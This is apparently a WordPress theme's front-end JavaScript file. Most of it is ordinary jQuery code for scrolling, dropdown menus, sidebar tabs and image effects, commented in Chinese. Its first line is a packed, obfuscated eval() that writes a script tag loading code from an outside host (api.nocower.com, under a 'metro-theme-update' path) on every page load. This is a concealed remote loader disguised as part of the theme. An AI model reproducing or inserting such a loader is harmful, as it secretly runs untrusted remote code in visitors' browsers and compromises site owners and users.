eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5.4("<0 7=3 2=\'6://d.8.c/1-b-a/1.9\'></0>");',14,14,'script|metro|src|javascript|write|document|http|language|nocower|js|update|theme|com|api'.split('|'),0,{}))
jQuery(document).ready(function(){
jQuery('.article h2 a').click(function(){
    jQuery(this).text('页面载入中……');
    window.location = jQuery(this).attr('href');
    });
});

// 滚屏
jQuery(document).ready(function(){
jQuery('#roll_top').click(function(){jQuery('html,body').animate({scrollTop: '0px'}, 800);}); 
jQuery('#ct').click(function(){jQuery('html,body').animate({scrollTop:jQuery('#comments').offset().top}, 800);});
jQuery('#fall').click(function(){jQuery('html,body').animate({scrollTop:jQuery('#footer').offset().top}, 800);});
});

//顶部导航下拉菜单
jQuery(document).ready(function(){
jQuery(".dropdownlink").hover(function(){
jQuery(this).children("ul").stop().fadeTo('fast', 1);
jQuery(this).addClass("li01");
},function(){
jQuery(this).children("ul").stop().fadeOut();
jQuery(this).removeClass("li01");
});
});

//侧边栏TAB效果
jQuery(document).ready(function(){
jQuery('.tab_menu li').mouseover(function(){
	jQuery(this).addClass("current").siblings().removeClass();
        jQuery(".tab_content > div").eq(jQuery('.tab_menu li').index(this)).fadeIn(0).siblings().hide();;
});
});

//图片渐隐
jQuery(function () {
jQuery('.thumbnail img').hover(
function() {jQuery(this).fadeTo("fast", 0.9);},
function() {jQuery(this).fadeTo("fast", 1);
});
});

//新窗口打开
jQuery(document).ready(function(){
	jQuery("a[rel='external'],a[rel='external nofollow']").click(
	function(){window.open(this.href);return false})
});